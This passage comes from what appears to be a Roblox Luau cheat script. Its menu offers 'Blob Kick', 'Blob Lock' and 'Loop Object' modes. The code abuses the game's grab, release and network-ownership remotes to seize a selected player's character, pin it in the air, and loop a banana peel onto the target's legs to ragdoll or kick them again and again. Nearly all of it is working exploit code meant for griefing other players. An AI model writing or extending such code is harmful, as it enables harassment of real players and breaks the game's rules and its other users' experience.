														if fn14(k) then
															for _, v26 in ipairs({
																"Head",
																"HumanoidRootPart",
																"Torso",
																"Left Arm",
																"Right Arm",
																"Left Leg",
																"Right Leg",
															}) do
																local v27 = k:FindFirstChild(v26)

																if v27 then
																	pcall(function()
																		fn15(v27)
																	end)
																end
															end
														end
													else
														pcall(function()
															fn17(k, false)
														end)

														tbl8[k] = nil
													end
												end

												v23 = humanoidRootPart2

												if not flag12 then
													flag13 = true
													humanoidRootPart.CFrame = humanoidRootPart2.CFrame * cf2(0, -20, 0)
													fn15(humanoidRootPart)
													fn16(character)

													if not v22 then
														v22 = v19()
													end

													if n25 < v19() - v22 then
														flag12 = true
														v22 = nil
														humanoidRootPart.CFrame = cFrame * cf2(0, 3.5, 0)
														fn15(humanoidRootPart)
														fn16(character)
														flag13 = false
														flag11 = true
														bodyPosition = Instance.new("BodyPosition")
														bodyPosition.Name = "BlobKickBodyPos"
														bodyPosition.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
														bodyPosition.P = 50000
														bodyPosition.D = 100
														bodyPosition.Parent = humanoidRootPart2
														bodyGyro = Instance.new("BodyGyro")
														bodyGyro.Name = "BlobKickBodyGyro"
														bodyGyro.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
														bodyGyro.P = 50000
														bodyGyro.D = 150
														bodyGyro.CFrame = CFrame.new(humanoidRootPart2.Position, humanoidRootPart2.Position + v33(1, 0, 0))
														bodyGyro.Parent = humanoidRootPart2
														n27 = v19() + 0.25
													end
												else
													if not humanoidRootPart2 or not humanoidRootPart2.Parent then
														fn27()
														task.wait()
													else
														humanoidRootPart2.AssemblyLinearVelocity = vector
														humanoidRootPart2.AssemblyAngularVelocity = vector

														if bodyPosition and bodyPosition.Parent == humanoidRootPart2 then
															bodyPosition.Position = humanoidRootPart.Position + Vector3.new(0, 27.5, 0)
														end

														if bodyGyro and bodyGyro.Parent == humanoidRootPart2 then
															bodyGyro.CFrame = CFrame.new(humanoidRootPart2.Position, humanoidRootPart2.Position + v33(1, 0, 0))
														end

														if not n27 then
															n27 = v19() + 0.25
														end

														if n27 and v19() >= n27 then
															if n26 < (humanoidRootPart.Position - humanoidRootPart2.Position).Magnitude then
																fn27()
																flag12 = false
																flag11 = false
																v22 = v19()
																n27 = nil
																flag13 = true
																humanoidRootPart.CFrame = humanoidRootPart2.CFrame * cf2(0, -20, 0)
																fn15(humanoidRootPart)
																fn16(character)
																task.wait()
															else
																n27 = v19() + 0.25

																pcall(function()
																	v25.grab:FireServer(v25.rightDet, humanoidRootPart2, v25.rightWeld)
																	task.wait(0.01)
																	v25.release:FireServer(v25.rightWeld)
																	task.wait(0.05)
																end)

																task.wait()
															end

															continue
														end

														pcall(function()
															v25.grab:FireServer(v25.rightDet, humanoidRootPart2, v25.rightWeld)
															task.wait(0.01)
															v25.release:FireServer(v25.rightWeld)
															task.wait(0.05)
														end)

														task.wait()
														continue
													end

													continue
												end

												task.wait()
											end
										end
									end
								end
							end
						end
					end

					fn27()
					fn18(arg)
				end)

				table.insert(tbl10, v25)
				return tbl10
			end

			local function fn27(arg)
				local n25 = 0.15
				local n26 = 30
				local flag11 = false
				local v22 = nil
				local n27 = nil
				local v23 = nil
				local bodyPosition = nil
				local bodyGyro = nil
				local flag12 = false
				local tbl10 = {}
				local cFrame = nil
				local flag13 = false

				local function fn28()
					if bodyPosition then
						bodyPosition:Destroy()
						bodyPosition = nil
					end

					if bodyGyro then
						bodyGyro:Destroy()
						bodyGyro = nil
					end

					flag11 = false
					flag12 = false
				end

				local v24 = spawn_(function()
					while flag9 do
						if not fn20() then
							if v23 then
								fn28()
								local character = arg.Character

								if character then
									fn17(character, false)
									tbl8[character] = nil
									tbl9[character] = nil
									local humanoid = character:FindFirstChild("Humanoid")

									if humanoid then
										humanoid.PlatformStand = false
										humanoid.Sit = false
									end

									local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

									if humanoidRootPart then
										fn15(humanoidRootPart)
									end
								end
							end

							flag12 = false
							flag11 = false
							v22 = nil
							n27 = nil
							v23 = nil
						end

						task.wait()
					end
				end)

				table.insert(tbl10, v24)

				local v25 = spawn_(function()
					while flag9 do
						if v23 and v23.Parent and fn20() then
							pcall(function()
								sno:FireServer(v23, v23.CFrame)
							end)
						end

						task.wait()
					end
				end)

				table.insert(tbl10, v25)

				local v26 = spawn_(function()
					while flag9 do
						if v23 and v23.Parent and fn20() then
							pcall(function()
								destroyLine:FireServer(v23)
							end)
						end

						task.wait(0.001)
					end
				end)

				table.insert(tbl10, v26)

				local v27 = spawn_(function()
					while flag9 and arg and arg.Parent do
						if not fn20() then
							fn18(arg)
							fn28()
							flag12 = false
							flag11 = false
							v22 = nil
							n27 = nil
							v23 = nil
							flag13 = false
							cFrame = nil
							task.wait()
						else
							local character = lp3.Character

							if not character then
								task.wait()
							else
								local humanoid = character:FindFirstChild("Humanoid")

								if not humanoid or humanoid.Health <= 0 then
									task.wait()
								else
									local v27 = fn19(v20)

									if not v27 then
										task.wait()
									else
										local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

										if not humanoidRootPart then
											task.wait()
										else
											if not flag13 then
												cFrame = humanoidRootPart.CFrame
											end

											local character2 = arg.Character
											local humanoid2 = character2 and character2:FindFirstChild("Humanoid")
											local humanoidRootPart2 = character2 and character2:FindFirstChild("HumanoidRootPart")

											if not character2 or not humanoid2 or humanoid2.Health <= 0 or not humanoidRootPart2 then
												if character2 then
													fn17(character2, false)
													tbl8[character2] = nil
													tbl9[character2] = nil
												end

												fn28()

												if flag13 and cFrame then
													humanoidRootPart.CFrame = cFrame * cf2(0, 3.5, 0)
													fn15(humanoidRootPart)
													fn16(character)
													flag13 = false
													cFrame = nil
												end

												task.wait()
											else
												tbl8[character2] = true
												tbl9[character2] = true
												fn17(character2, true)

												for k in pairs(tbl8) do
													if k and k.Parent and tbl9[k] then
														if fn14(k) then
															for _, v28 in ipairs({
																"Head",
																"HumanoidRootPart",
																"Torso",
																"Left Arm",
																"Right Arm",
																"Left Leg",
																"Right Leg",
															}) do
																local v29 = k:FindFirstChild(v28)

																if v29 then
																	pcall(function()
																		fn15(v29)
																	end)
																end
															end
														end
													else
														pcall(function()
															fn17(k, false)
														end)

														tbl8[k] = nil
													end
												end

												v23 = humanoidRootPart2

												if not flag12 then
													flag13 = true
													humanoidRootPart.CFrame = humanoidRootPart2.CFrame * cf2(0, -20, 0)
													fn15(humanoidRootPart)
													fn16(character)

													if not v22 then
														v22 = v19()
													end

													if v19() - v22 > n25 then
														flag12 = true
														v22 = nil
														humanoidRootPart.CFrame = cFrame * cf2(0, 3.5, 0)
														fn15(humanoidRootPart)
														fn16(character)
														flag13 = false
														flag11 = true
														bodyPosition = Instance.new("BodyPosition")
														bodyPosition.Name = "BlobKickBodyPos"
														bodyPosition.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
														bodyPosition.P = 50000
														bodyPosition.D = 200
														bodyPosition.Parent = humanoidRootPart2
														bodyGyro = Instance.new("BodyGyro")
														bodyGyro.Name = "BlobKickBodyGyro"
														bodyGyro.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
														bodyGyro.P = 50000
														bodyGyro.D = 150
														bodyGyro.CFrame = CFrame.new(humanoidRootPart2.Position, humanoidRootPart2.Position + v33(1, 0, 0))
														bodyGyro.Parent = humanoidRootPart2
													end
												else
													if not humanoidRootPart2 or not humanoidRootPart2.Parent then
														fn28()
														task.wait()
													else
														humanoidRootPart2.AssemblyLinearVelocity = vector
														humanoidRootPart2.AssemblyAngularVelocity = vector

														if bodyPosition and bodyPosition.Parent == humanoidRootPart2 then
															bodyPosition.Position = humanoidRootPart.Position + Vector3.new(0, 25, 0)
														end

														if bodyGyro and bodyGyro.Parent == humanoidRootPart2 then
															bodyGyro.CFrame = CFrame.new(humanoidRootPart2.Position, humanoidRootPart2.Position + v33(1, 0, 0))
														end

														if not n27 then
															n27 = v19() + 0.25
														end

														if n27 and v19() >= n27 then
															if n26 < (humanoidRootPart.Position - humanoidRootPart2.Position).Magnitude then
																fn28()
																flag12 = false
																flag11 = false
																v22 = v19()
																n27 = nil
																flag13 = true
																humanoidRootPart.CFrame = humanoidRootPart2.CFrame * cf2(0, -20, 0)
																fn15(humanoidRootPart)
																fn16(character)
																task.wait()
															else
																pcall(function()
																	v27.grab:FireServer(v27.rightDet, humanoidRootPart2, v27.rightWeld)
																	task.wait(0.01)
																	v27.release:FireServer(v27.rightWeld)
																	task.wait(0.05)
																end)

																task.wait()
															end

															continue
														end

														pcall(function()
															v27.grab:FireServer(v27.rightDet, humanoidRootPart2, v27.rightWeld)
															task.wait(0.01)
															v27.release:FireServer(v27.rightWeld)
															task.wait(0.05)
														end)

														task.wait()
														continue
													end

													continue
												end

												task.wait()
											end
										end
									end
								end
							end
						end
					end

					fn28()
					fn18(arg)
				end)

				table.insert(tbl10, v27)
				return tbl10
			end

			local function fn28(arg)
				local n25 = 0.15
				local n26 = 30
				local flag11 = false
				local v22 = nil
				local n27 = nil
				local v23 = nil
				local bodyPosition = nil
				local bodyGyro = nil
				local flag12 = false
				local tbl10 = {}
				local cFrame = nil
				local position = nil
				local flag13 = false
				local n28 = 25
				local n29 = 14
				local n30 = 0
				local connection4 = nil

				local function fn29()
					if bodyPosition then
						bodyPosition:Destroy()
						bodyPosition = nil
					end

					if bodyGyro then
						bodyGyro:Destroy()
						bodyGyro = nil
					end

					if connection4 then
						connection4:Disconnect()
						connection4 = nil
					end

					flag11 = false
					flag12 = false
				end

				local v24 = spawn_(function()
					while flag9 do
						if not fn20() then
							if v23 then
								fn29()
								local character = arg.Character

								if character then
									fn17(character, false)
									tbl8[character] = nil
									tbl9[character] = nil
									local humanoid = character:FindFirstChild("Humanoid")

									if humanoid then
										humanoid.PlatformStand = false
										humanoid.Sit = false
									end

									local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

									if humanoidRootPart then
										fn15(humanoidRootPart)
									end
								end
							end

							flag12 = false
							flag11 = false
							v22 = nil
							n27 = nil
							v23 = nil
						end

						task.wait()
					end
				end)

				table.insert(tbl10, v24)

				local v25 = spawn_(function()
					while flag9 do
						if v23 and v23.Parent and fn20() then
							pcall(function()
								sno:FireServer(v23, v23.CFrame)
							end)
						end

						task.wait()
					end
				end)

				table.insert(tbl10, v25)

				local v26 = spawn_(function()
					while flag9 do
						if v23 and v23.Parent and fn20() then
							pcall(function()
								destroyLine:FireServer(v23)
							end)
						end

						task.wait(0.001)
					end
				end)

				table.insert(tbl10, v26)

				local v27 = spawn_(function()
					while flag9 and arg and arg.Parent do
						if not fn20() then
							fn18(arg)
							fn29()
							flag12 = false
							flag11 = false
							v22 = nil
							n27 = nil
							v23 = nil
							flag13 = false
							cFrame = nil
							task.wait()
						else
							local character = lp3.Character

							if not character then
								task.wait()
							else
								local humanoid = character:FindFirstChild("Humanoid")

								if not humanoid or humanoid.Health <= 0 then
									task.wait()
								else
									local v27 = fn19(v20)

									if not v27 then
										task.wait()
									else
										local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

										if not humanoidRootPart then
											task.wait()
										else
											if not flag13 and not flag11 then
												cFrame = humanoidRootPart.CFrame
												position = cFrame.Position + Vector3.new(0, 10, 0)
											end

											local character2 = arg.Character
											local humanoid2 = character2 and character2:FindFirstChild("Humanoid")
											local humanoidRootPart2 = character2 and character2:FindFirstChild("HumanoidRootPart")

											if not character2 or not humanoid2 or humanoid2.Health <= 0 or not humanoidRootPart2 then
												if character2 then
													fn17(character2, false)
													tbl8[character2] = nil
													tbl9[character2] = nil
												end

												fn29()

												if flag13 and cFrame then
													humanoidRootPart.CFrame = cFrame * cf2(0, 3.5, 0)
													fn15(humanoidRootPart)
													fn16(character)
													flag13 = false
													cFrame = nil
												end

												task.wait()
											else
												tbl8[character2] = true
												tbl9[character2] = true
												fn17(character2, true)

												for k in pairs(tbl8) do
													if k and k.Parent and tbl9[k] then
														if fn14(k) then
															for _, v28 in ipairs({
																"Head",
																"HumanoidRootPart",
																"Torso",
																"Left Arm",
																"Right Arm",
																"Left Leg",
																"Right Leg",
															}) do
																local v29 = k:FindFirstChild(v28)

																if v29 then
																	pcall(function()
																		fn15(v29)
																	end)
																end
															end
														end
													else
														pcall(function()
															fn17(k, false)
														end)

														tbl8[k] = nil
													end
												end

												v23 = humanoidRootPart2

												if not flag12 then
													flag13 = true
													humanoidRootPart.CFrame = humanoidRootPart2.CFrame * cf2(0, -10, 0)
													fn15(humanoidRootPart)
													fn16(character)

													if not v22 then
														v22 = v19()
													end

													if v19() - v22 > n25 then
														flag12 = true
														v22 = nil
														flag13 = false
														flag11 = true
														bodyPosition = Instance.new("BodyPosition")
														bodyPosition.Name = "BlobKickBodyPos"
														bodyPosition.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
														bodyPosition.P = 50000
														bodyPosition.D = 100
														bodyPosition.Parent = humanoidRootPart2
														bodyGyro = Instance.new("BodyGyro")
														bodyGyro.Name = "BlobKickBodyGyro"
														bodyGyro.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
														bodyGyro.P = 50000
														bodyGyro.D = 150
														bodyGyro.CFrame = CFrame.new(humanoidRootPart2.Position, humanoidRootPart2.Position + v33(1, 0, 0))
														bodyGyro.Parent = humanoidRootPart2

														if not connection4 then
															connection4 = game:GetService("RunService").Heartbeat:Connect(function(deltaTime)
																if not flag9 or not flag11 then
																	if connection4 then
																		connection4:Disconnect()
																		connection4 = nil
																	end

																	return
																end

																if humanoidRootPart and position then
																	n30 += n29 * deltaTime
																	humanoidRootPart.CFrame = CFrame.new(Vector3.new(position.X + math.cos(n30) * n28, position.Y, position.Z + math.sin(n30) * n28), position)
																	fn15(humanoidRootPart)
																	fn16(character)
																end
															end)
														end
													end
												else
													if not humanoidRootPart2 or not humanoidRootPart2.Parent then
														fn29()
														task.wait()
													else
														humanoidRootPart2.AssemblyLinearVelocity = vector
														humanoidRootPart2.AssemblyAngularVelocity = vector

														if bodyPosition and bodyPosition.Parent == humanoidRootPart2 then
															bodyPosition.Position = position
														end

														if bodyGyro and bodyGyro.Parent == humanoidRootPart2 then
															bodyGyro.CFrame = CFrame.new(humanoidRootPart2.Position, humanoidRootPart2.Position + v33(1, 0, 0))
														end

														if not n27 then
															n27 = v19() + 0.25
														end

														if n27 and v19() >= n27 then
															if n26 < (humanoidRootPart.Position - humanoidRootPart2.Position).Magnitude then
																fn29()
																flag12 = false
																flag11 = false
																v22 = v19()
																n27 = nil
																flag13 = true
																humanoidRootPart.CFrame = humanoidRootPart2.CFrame * cf2(0, -20, 0)
																fn15(humanoidRootPart)
																fn16(character)
																task.wait()
															else
																pcall(function()
																	v27.grab:FireServer(v27.rightDet, humanoidRootPart2, v27.rightWeld)
																	task.wait(0.01)
																	v27.release:FireServer(v27.rightWeld)
																	task.wait(0.05)
																end)

																task.wait()
															end

															continue
														end

														pcall(function()
															v27.grab:FireServer(v27.rightDet, humanoidRootPart2, v27.rightWeld)
															task.wait(0.01)
															v27.release:FireServer(v27.rightWeld)
															task.wait(0.05)
														end)

														task.wait()
														continue
													end

													continue
												end

												task.wait()
											end
										end
									end
								end
							end
						end
					end

					fn29()
					fn18(arg)
				end)

				table.insert(tbl10, v27)
				return tbl10
			end

			local function fn29(arg)
				local userId = arg and arg.UserId

				local v22 = spawn_(function()
					while flag9 and userId do
						local playerByUserId = ps2:GetPlayerByUserId(userId)

						if playerByUserId and playerByUserId.Parent then
							local flag11 = tbl6 and #tbl6 > 0
							local flag12 = true

							if flag11 then
								flag12 = false

								for _, v22 in ipairs(tbl6) do
									if v22 and v22 ~= resumeThread and coroutine.status(v22) == "dead" then
										flag12 = true
										break
									else
										flag12 = false
									end
								end
							end

							if flag12 then
								for _, v22 in ipairs(tbl6) do
									if v22 and v22 ~= resumeThread then
										cancel(v22)
									end
								end

								tbl6 = {}
								flag9 = true
								local v22

								if str6 == "Blob Kick (Circle Spin)" then
									v22 = fn28(playerByUserId)
								elseif str6 == "Blob Lock" then
									v22 = fn26(playerByUserId)
								else
									v22 = fn27(playerByUserId)
								end

								table.insert(tbl6, resumeThread)

								for _, v23 in ipairs(v22) do
									table.insert(tbl6, v23)
								end
							end
						end

						task.wait()
					end
				end)

				table.insert(tbl6, v22)
			end

			local function fn30(arg)
				if not arg or not arg.Parent then
					return
				end
				kickPlayer = arg

				pcall(function()
					fn21()
					flag9 = true

					if str6 == "Blob Kick (Circle Spin)" then
						tbl6 = fn28(arg)
					elseif str6 == "Blob Lock" then
						tbl6 = fn26(arg)
					else
						tbl6 = fn27(arg)
					end

					fn29(arg)
				end)
			end

			blobmanDestroyBlock:CreateDropdown({
				Name = "Kick Methods",
				Items = { "Blob Kick", "Blob Kick (Circle Spin)", "Blob Lock" },
				Default = "Blob Kick",
				Callback = function(arg)
					str6 = arg
					playSound(sounds.Notify)

					if MainToggle and MainToggle.Get and MainToggle:Get() then
						flag9 = false
						fn21()

						if selected4 and selected4.kickPlayer then
							fn18(selected4.kickPlayer)
						end

						task.wait()
						flag9 = true

						if str6 == "Blob Kick (Circle Spin)" then
							tbl6 = fn28(selected4.kickPlayer)
						elseif str6 == "Blob Lock" then
							tbl6 = fn26(selected4.kickPlayer)
						else
							tbl6 = fn27(selected4.kickPlayer)
						end

						fn29(selected4.kickPlayer)
					end
				end,
			})

			local v22 = blobmanDestroyBlock:CreateToggle({
				Name = "Enable Selected Method",
				Default = false,
				Callback = function(arg)
					if arg then
						if not selected4 or not selected4.kickPlayer then
							playSound(sounds.Kick)
							MainToggle:Set(false)
							return
						end

						fn21()
						kickPlayer = selected4.kickPlayer

						if v21 then
							cancel(v21)
						end

						v21 = spawn_(function()
							while true do
								if flag9 then
									local kickPlayer2 = selected4.kickPlayer

									if kickPlayer2 and kickPlayer2.Parent and kickPlayer2 ~= kickPlayer then
										fn30(kickPlayer2)
									end
								end

								task.wait()
							end
						end)

						flag9 = true
						local kickPlayer2 = selected4.kickPlayer

						if str6 == "Blob Kick (Circle Spin)" then
							tbl6 = fn28(kickPlayer2)
						elseif str6 == "Blob Lock" then
							tbl6 = fn26(kickPlayer2)
						else
							tbl6 = fn27(kickPlayer2)
						end

						fn29(kickPlayer2)
						playSound(sounds.Notify)
					else
						flag9 = false
						fn21()

						if v21 then
							cancel(v21)
							v21 = nil
						end

						kickPlayer = nil

						if selected4 and selected4.kickPlayer then
							fn18(selected4.kickPlayer)
						end

						v20 = nil
					end
				end,
			})

			blobmanDestroyBlock:CreateToggle({
				Name = "Auto Sit to Blob",
				Default = false,
				Callback = function(arg)
					flag10 = arg

					if flag10 then
						fn24()
					else
						fn25()
					end
				end,
			})

			_G.BlobmanKickToggle = v22
		end

		local lp4
		lp4 = _G.LP
		local ws4
		ws4 = _G.WS
		local repS
		repS = _G.RepS
		local cf3
		cf3 = _G.CF
		local v34
		v34 = _G.V3
		local playSound2
		playSound2 = _G.PlaySound
		local sounds2
		sounds2 = _G.Sounds
		local rs3
		rs3 = _G.RS
		local ge, sno2, destroyRemote, selected5, v22, loopBanana

		do
			local states = _G.States
			local he = _G.HE
			ge = _G.GE
			sno2 = _G.SNO
			destroyRemote = _G.DestroyRemote
			selected5 = _G.Selected
			v22 = _G.TargetTab:CreateBlock({ Name = "Loop Object", Side = "Left", ImageID = "15889469852" })

			states.LoopBanana = states.LoopBanana or {
				enabled = false,
				loopThread = nil,
				hasItem = false,
				currentBanana = nil,
				bananaParts = {},
				lastNetworkUpdate = 0,
				lastOwnershipCheck = 0,
				isTakingOwnership = false,
				originalPos = nil,
				waitingForRespawn = false,
				ownershipFailCount = 0,
				targetAlive = false,
				respawnConnection = nil,
				holdPosition = v34(0, -7, 10000),
			}

			loopBanana = states.LoopBanana
			states.LoopPallet = states.LoopPallet or { enabled = false, thread = nil, currentPallet = nil }
			local loopPallet = states.LoopPallet
			local str7 = "FoodBanana / peel"
			local n25 = 0

			local function fn14()
				local Stats2 = game:GetService("Stats")

				if Stats2 and Stats2.Network and Stats2.Network.ServerStatsItem then
					n25 = Stats2.Network.ServerStatsItem["Data Ping"]:GetValue() / 2000
				end
			end

			local function fn15(arg)
				if he and he:FindFirstChild("Use") then
					pcall(function()
						he.Use:FireServer(arg)
					end)
				end
			end

			local function fn16()
				local v23 = ws4:FindFirstChild(lp4.Name .. "SpawnedInToys")

				if v23 then
					for _, child in pairs(v23:GetChildren()) do
						if child.Name == "FoodBanana" or child.Name == "BananaPeel" then
							pcall(function()
								if destroyRemote then
									destroyRemote:FireServer(child)
								end
							end)
						end
					end
				end
			end

			local function fn17()
				local v23 = ws4:FindFirstChild(lp4.Name .. "SpawnedInToys")

				if v23 then
					for _, child in ipairs(v23:GetChildren()) do
						if child.Name == "PalletLightBrown" then
							pcall(function()
								local v24 = destroyRemote
								local destroyRemote2

								if destroyRemote then
									destroyRemote2 = v24
								else
									destroyRemote2 = _G.DestroyRemote
								end

								if destroyRemote2 then
									destroyRemote2:FireServer(child)
								end
							end)
						end
					end
				end

				if loopPallet.currentPallet then
					pcall(function()
						local destroyRemote2 = destroyRemote or _G.DestroyRemote

						if destroyRemote2 then
							destroyRemote2:FireServer(loopPallet.currentPallet)
						end
					end)

					loopPallet.currentPallet = nil
				end
			end

			local function fn18()
				if loopBanana.currentBanana and loopBanana.currentBanana.Parent then
					pcall(function()
						if destroyRemote then
							destroyRemote:FireServer(loopBanana.currentBanana)
						end
					end)
				end

				loopBanana.currentBanana = nil
				loopBanana.bananaParts = {}
				loopBanana.hasItem = false
			end

			local function fn19(arg)
				if not arg or not arg.Parent then
					return false
				end

				for _, child in pairs(arg:GetChildren()) do
					if child.Name == "EdiblePart" then
						return true
					end
				end

				return false
			end

			local function fn20(arg)
				if not arg then
					return false
				end

				for _, child in ipairs(arg:GetChildren()) do
					if child:IsA("BasePart") then
						local partOwner = child:FindFirstChild("PartOwner")
						if partOwner and partOwner.Value == lp4.Name then
							return true
						end
					end
				end

				for _, child in ipairs(arg:GetChildren()) do
					if child:IsA("BasePart") then
						local partOwner = child:FindFirstChild("PartOwner")
						if partOwner and partOwner.Value ~= "" and partOwner.Value ~= lp4.Name then
							return false
						end
					end
				end

				return true
			end

			local function fn21(arg)
				if not arg then
					return
				end
				loopBanana.bananaParts = {}

				for _, child in ipairs(arg:GetChildren()) do
					if child:IsA("BasePart") then
						pcall(function()
							sno2:FireServer(child, child.CFrame)
							child.CanTouch = true
							child.CanCollide = true
							child.Anchored = false
							table.insert(loopBanana.bananaParts, child)
						end)
					end
				end
			end

			local function fn22(currentBanana)
				if not currentBanana or loopBanana.isTakingOwnership then
					return false
				end
				loopBanana.isTakingOwnership = true
				local character = lp4.Character
				if not character then
					loopBanana.isTakingOwnership = false
					return false
				end
				local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
				if not humanoidRootPart then
					loopBanana.isTakingOwnership = false
					return false
				end
				local v23 = nil

				for _, child in ipairs(currentBanana:GetChildren()) do
					if child:IsA("BasePart") then
						v23 = child
						break
					end
				end

				if not v23 then
					loopBanana.isTakingOwnership = false
					return false
				end
				loopBanana.originalPos = humanoidRootPart.CFrame
				humanoidRootPart.CFrame = v23.CFrame * cf3(0, -6, 0)
				task.wait(0.05)

				pcall(function()
					if ge and ge.CreateGrabLine then
						ge.CreateGrabLine:FireServer(v23, cf3(0, 9e9, 0))
					end

					if ge and ge.DestroyGrabLine then
						ge.DestroyGrabLine:FireServer(v23)
					end
				end)

				local flag11 = false
				local n26 = 0

				while not flag11 and n26 < 15 do
					for _, child in ipairs(currentBanana:GetChildren()) do
						if child:IsA("BasePart") then
							pcall(function()
								sno2:FireServer(child, child.CFrame)
							end)
						end
					end

					task.wait(0.05)
					n26 += 1

					for _, child in ipairs(currentBanana:GetChildren()) do
						if child:IsA("BasePart") then
							local partOwner = child:FindFirstChild("PartOwner")
							if partOwner and partOwner.Value == lp4.Name then
								flag11 = true
								break
							end
						end
					end
				end

				if not flag11 then
					loopBanana.ownershipFailCount = loopBanana.ownershipFailCount + 1

					if loopBanana.originalPos then
						humanoidRootPart.CFrame = loopBanana.originalPos
						humanoidRootPart.Velocity = v34(0, 0, 0)
						humanoidRootPart.AssemblyLinearVelocity = v34(0, 0, 0)
					end

					loopBanana.isTakingOwnership = false
					loopBanana.originalPos = nil

					if loopBanana.ownershipFailCount >= 2 then
						fn18()
						loopBanana.ownershipFailCount = 0
					end

					return false
				end

				loopBanana.bananaParts = {}

				for _, child in ipairs(currentBanana:GetChildren()) do
					if child:IsA("BasePart") then
						pcall(function()
							sno2:FireServer(child, child.CFrame)
							child.CanTouch = true
							child.CanCollide = true
							child.Anchored = false
							table.insert(loopBanana.bananaParts, child)
						end)
					end
				end

				if loopBanana.originalPos then
					humanoidRootPart.CFrame = loopBanana.originalPos
					humanoidRootPart.Velocity = v34(0, 0, 0)
					humanoidRootPart.AssemblyLinearVelocity = v34(0, 0, 0)
				end

				loopBanana.isTakingOwnership = false
				loopBanana.originalPos = nil
				loopBanana.ownershipFailCount = 0
				loopBanana.currentBanana = currentBanana
				return true
			end

			local function fn23()
				if loopBanana.respawnConnection then
					loopBanana.respawnConnection:Disconnect()
					loopBanana.respawnConnection = nil
				end

				local kickPlayer2 = selected5.kickPlayer
				if not kickPlayer2 then
					return
				end

				loopBanana.respawnConnection = kickPlayer2.CharacterAdded:Connect(function()
					if loopBanana.enabled then
						loopBanana.targetAlive = true
						loopBanana.waitingForRespawn = false
					end
				end)
			end

			local function fn24()
				if not loopBanana.currentBanana or not loopBanana.currentBanana.Parent or #loopBanana.bananaParts == 0 then
					return
				end
				local holdPosition = loopBanana.holdPosition

				for _, bananaPart in ipairs(loopBanana.bananaParts) do
					if bananaPart and bananaPart.Parent then
						pcall(function()
							bananaPart.Position = holdPosition
							bananaPart.AssemblyLinearVelocity = v34(0, 0, 0)
							bananaPart.AssemblyAngularVelocity = v34(0, 0, 0)
						end)
					end
				end
			end

			local function fn25(arg)
				arg = arg and arg:FindFirstChild("Humanoid")
				local ragdolled = arg and arg:FindFirstChild("Ragdolled")
				return ragdolled and ragdolled.Value == true
			end

			local function fn26(arg)
				if not arg then
					return nil
				end
				local leftLeg = arg:FindFirstChild("Left Leg")
				local rightLeg = arg:FindFirstChild("Right Leg")
				local isBasePart = leftLeg and leftLeg:IsA("BasePart")
				local isBasePart2 = rightLeg and rightLeg:IsA("BasePart")
				if isBasePart and isBasePart2 then
					return (leftLeg.Position + rightLeg.Position) / 2
				end

				if isBasePart then
					return leftLeg.Position
				end

				if isBasePart2 then
					return rightLeg.Position
				end
				return nil
			end

			local function fn27(arg)
				if not arg then
					return v34(0, 0, 0)
				end
				local leftLeg = arg:FindFirstChild("Left Leg")
				local rightLeg = arg:FindFirstChild("Right Leg")
				local isBasePart = leftLeg and leftLeg:IsA("BasePart")
				local isBasePart2 = rightLeg and rightLeg:IsA("BasePart")
				if isBasePart and isBasePart2 then
					return (leftLeg.AssemblyLinearVelocity + rightLeg.AssemblyLinearVelocity) / 2
				end

				if isBasePart then
					return leftLeg.AssemblyLinearVelocity
				end

				if isBasePart2 then
					return rightLeg.AssemblyLinearVelocity
				end
				return v34(0, 0, 0)
			end

			local function fn28(arg, arg2)
				if not arg then
					return nil
				end
				local v23 = fn26(arg)
				if not v23 then
					return nil
				end
				local v24 = fn27(arg)

				if v24.Magnitude > 200 then
					v24 = v34(0, 0, 0)
				end

				if v24.Magnitude > 0.2 then
					v23 += v24 * (math.min(arg2, 0.1) + 0.05)
				end

				return v23
			end

			local function fn29(arg, arg2)
				if not arg then
					return nil
				end
				local humanoidRootPart = arg:FindFirstChild("HumanoidRootPart")
				if not humanoidRootPart then
					return nil
				end
				local position = humanoidRootPart.Position
				local assemblyLinearVelocity = humanoidRootPart.AssemblyLinearVelocity

				if assemblyLinearVelocity.Magnitude > 200 then
					assemblyLinearVelocity = v34(0, 0, 0)
				end

				return position + assemblyLinearVelocity * (math.min(arg2, 0.1) + 0.05)
			end

			local function fn30()
				if not loopBanana.currentBanana or not loopBanana.currentBanana.Parent or #loopBanana.bananaParts == 0 or loopBanana.isTakingOwnership then
					return
				end
				local now2 = tick()

				if now2 - loopBanana.lastOwnershipCheck > 0.1 then
					loopBanana.lastOwnershipCheck = now2

					if not fn20(loopBanana.currentBanana) then
						for _, bananaPart in ipairs(loopBanana.bananaParts) do
							if bananaPart and bananaPart.Parent then
								local partOwner = bananaPart:FindFirstChild("PartOwner")
								if partOwner and partOwner.Value ~= "" and partOwner.Value ~= lp4.Name then
									fn18()
									return
								end
							end
						end

						task.spawn(function()
							fn22(loopBanana.currentBanana)
						end)

						return
					end
				end

				fn14()
				local kickPlayer2 = selected5.kickPlayer
				if not kickPlayer2 or not kickPlayer2.Parent then
					return
				end
				local character = kickPlayer2.Character
				local humanoid = character and character:FindFirstChild("Humanoid")
				humanoid = humanoid and humanoid.Health > 0
				local v23 = fn26(character)

				if not humanoid or not character or not v23 or fn25(character) then
					if not loopBanana.waitingForRespawn then
						loopBanana.waitingForRespawn = true
						loopBanana.targetAlive = false
						loopBanana.holdPosition = v34(0, -7, 10000)
						fn24()
						fn23()
					else
						fn24()
					end

					return
				end

				if loopBanana.waitingForRespawn then
					loopBanana.waitingForRespawn = false
					loopBanana.targetAlive = true

					if loopBanana.respawnConnection then
						loopBanana.respawnConnection:Disconnect()
						loopBanana.respawnConnection = nil
					end
				end

				local v24 = fn28(character, n25)
				if not v24 then
					return
				end
				local flag11 = now2 - loopBanana.lastNetworkUpdate > 0.4

				for _, bananaPart in ipairs(loopBanana.bananaParts) do
					if bananaPart and bananaPart.Parent then
						pcall(function()
							bananaPart.Position = v24
							bananaPart.AssemblyLinearVelocity = v34(0, 0, 0)
							bananaPart.AssemblyAngularVelocity = v34(0, 0, 0)

							if flag11 and ge and ge.DestroyGrabLine then
